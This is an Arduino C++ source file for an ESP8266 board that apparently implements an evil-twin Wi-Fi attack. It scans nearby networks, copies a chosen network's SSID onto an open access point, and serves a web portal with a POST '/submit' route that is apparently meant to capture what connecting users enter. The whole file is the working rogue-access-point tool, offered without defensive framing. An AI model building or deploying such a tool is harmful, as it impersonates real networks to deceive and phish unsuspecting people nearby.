#include <ESP8266WiFi.h>
#include "View.h"
#include "WebPortal.h"

using namespace View;
using namespace WebPortal;

#define MAXSSIDS 50

uint8_t numNetworks = 0;
String knownSSIDs[MAXSSIDS];

IPAddress local_IP(192,168,4,22);
IPAddress gateway(192,168,4,9);
IPAddress subnet(255,255,255,0);

ESP8266WebServer server(DEFAULT_PORT);

String SSID;
bool apStarted = false;

void setup() {

    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(); // Disconnect from any previously connected network

    delay(1000); // Wait for the module to disconnect

    Serial.begin(115200);
    Serial.flush();

    //connecting to internet
    WiFi.begin(HOST_SSID, HOST_PASSWORD);
    while (WiFi.status() != WL_CONNECTED){
        Serial.println(".");
        delay(1000);
    }
    Serial.println("Connected To Internet");
    
}


void loop(){
    
    if (!apStarted){

        printInstruction();
        while (!Serial.available()) {
            // Wait for user input
        }
        char input = Serial.read();

        switch (input){
            case '1':
                findNewNetworks();
                break;
            case '2':
                MimicNetwork();
                break;
            case '3':
                Serial.print("Enter custom SSID: ");
                getStrInput(SSID);
                createAP();
                break;
            default:
                Serial.println("Enter a Valid Answer: ");
                printInstruction();
                break;
        }
    }
    else{
        server.handleClient();
    }
            
    delay(500);
}

void findNewNetworks(){
    Serial.println("\nScanning for available networks:");

    uint8_t newNumNetworks = WiFi.scanNetworks();

    for (uint8_t i = 0; i < newNumNetworks; i++){
        String newSSID = WiFi.SSID(i);
        bool newNetwork = true;

        for (uint8_t k = 0; k < numNetworks; k++){
            if(newSSID == knownSSIDs[k]){
            newNetwork = false;
            break;
            }
        }

        if(newNetwork){
            printNetwork(WiFi.SSID(i), WiFi.RSSI(i), numNetworks);
            knownSSIDs[numNetworks] = newSSID;
            numNetworks++;
        }
    }
}

void MimicNetwork(){
    printAllNetwork();
    
    Serial.print("\nWhich network # to mimic: ");
    uint8_t networkNum;
    getIntInput(networkNum);
    Serial.printf("\nChosing network #%d\n", networkNum);

    if(networkNum >= 0 && networkNum < numNetworks){
        SSID = knownSSIDs[networkNum];
        createAP();
    }else{
        Serial.println("Invalid network number.");
    }
    
    
}

void createAP(){
    Serial.print("Creating custom network: ");
    Serial.println(SSID);
    
    if (!WiFi.softAPConfig(local_IP, gateway, subnet)) {
        Serial.println("Failed to configure softAP");
        return;
    }
    
    //WiFi.softAP(SSID, AP_PASSWORD,1, false, 4)
    if (!WiFi.softAP(SSID)) {
        Serial.println("Failed to start softAP");
        return;
    }
    delay(500);

    Serial.println("\nHTTP server started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());

    server.on("/", handleConnect);
    server.on("/submit", HTTP_POST, handleSubmit);
    //server.onNotFound(handleNotFound);
    server.begin();
    apStarted = true;
}

void printAllNetwork(){
    for (uint8_t i = 0; i < numNetworks; i++){
        printNetwork(WiFi.SSID(i), WiFi.RSSI(i), i);
    }
    
}
